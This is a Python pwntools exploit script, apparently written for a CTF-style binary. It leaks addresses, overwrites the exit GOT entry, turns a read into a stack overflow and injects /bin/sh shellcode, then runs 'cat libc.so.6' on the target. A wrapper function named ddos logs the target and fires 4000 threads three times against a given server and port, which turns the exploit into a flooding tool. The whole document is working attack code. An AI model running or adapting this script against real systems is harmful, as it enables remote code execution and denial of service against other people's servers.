from pwn import *
import warnings

warnings.filterwarnings("ignore")
context.timeout=1

def ddoser(server,port):
    try:
        p = remote(server, port,timeout=1)
        # p = process("./one")
        p.recvuntil(b"= ",timeout=1)
        main = p.recvuntil(b" and")[:-4]
        main = int(main, 16)
        base_process = main - 0x13B8
        exit_addr = base_process + 0x4050
        target = base_process + 0x12A0

        p.recvuntil(b"=  ")

        stack = p.recvuntil(b"\n")[:-1]
        stack = int(stack, 16)
        print(hex(base_process))
        print(hex(stack))
        # attach(p)
        # 第一次，改exit的got到libc_main_start,死循环
        p.sendlineafter(b"What address you want to write?", hex(exit_addr))
        p.sendlineafter(b"What value you want to write?", str(240))
        p.sendlineafter(b"What address you want to modify?", hex(base_process + 0x1000))

        # 第二次修改read的大小，变成栈溢出
        p.sendlineafter(b"What address you want to write?", hex(target))
        p.sendlineafter(b"What value you want to write?", str(0xAA))

        shell = b'H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05'
        payload = (hex((stack // 0x1000) * 0x1000).encode() + b'\x00').ljust(0x20, b'a') + p64(stack - 1000) + p64(
            stack + 0x7ffe8f0733f0 - 0x7ffe8f07351c) + shell
        # attach(p)
        p.sendlineafter(b"What address you want to modify?", payload)
        p.sendline("cat libc.so.6")

    except:
        pass


def ddos(server,port):
    with open("ddos日志.txt", 'a+') as f:
        f.write("攻击目标:" + server + ":" + str(port) + '\n')
        f.close()
        for i in range(3):
            threads = []
            for i in range(0, 4000):
                thread = threading.Thread(target=ddoser, args=(server, port))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

